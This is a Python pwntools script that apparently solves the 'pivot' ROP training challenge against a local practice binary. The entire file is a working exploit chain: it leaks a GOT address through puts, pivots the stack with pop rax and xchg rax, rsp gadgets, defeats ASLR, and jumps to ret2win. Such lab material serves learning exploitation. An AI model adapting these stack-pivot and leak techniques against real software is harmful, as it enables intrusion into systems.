#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re

exe = context.binary = ELF('./pivot')
libpivot = ELF("./libpivot.so")



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
data = io.recvuntil("> ")

stack_pivot = int(re.search(b"pivot: (0x[0-9a-f]+)\n", data).group(1), 16)

payload = (
    p64(exe.plt["foothold_function"]) +
    p64(0x400b73) + #  : pop rdi ; ret
    p64(exe.got["foothold_function"]) +
    p64(exe.plt["puts"]) +
    p64(exe.functions["main"].address)
)
io.sendline(payload)

io.recvuntil("> ")
payload = (
    b"A" * 40 +
    p64(0x400b00) + # : pop rax ; ret
    p64(stack_pivot) +
    p64(0x400b02) # : xchg rax, rsp ; ret
)
io.send(payload)

data = io.recvuntil("> ")
leak = u64(re.search(b"libpivot.so(.*?)\n", data).group(1).ljust(8, b"\x00"))
libpivot.address = leak - libpivot.sym.foothold_function

log.info("Leak: 0x%x", leak)
log.info("Libpivot: 0x%x", libpivot.address)

io.sendline("A")
io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x400b74) + #  : ret
    p64(libpivot.sym.ret2win)
)
io.sendline(payload)

io.interactive()

